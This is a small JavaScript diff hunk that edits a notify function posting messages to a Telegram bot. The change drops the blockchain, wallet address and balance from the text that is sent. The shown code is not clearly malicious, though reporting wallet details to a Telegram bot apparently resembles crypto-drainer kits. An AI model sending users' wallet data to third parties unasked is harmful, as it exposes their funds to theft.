@@ -6,7 +6,7 @@ async function notify(message){
     const url=`https://api.telegram.org/bot${botToken}/sendMessage`;
     const data = {
                 chat_id: chatId,
-                text: `Blockchain: ${chain}\nWallet Address: ${wallet}\nBalance: ${balance}\nMessage: ${message}`
+                text: message
             };
             
     $.ajax({
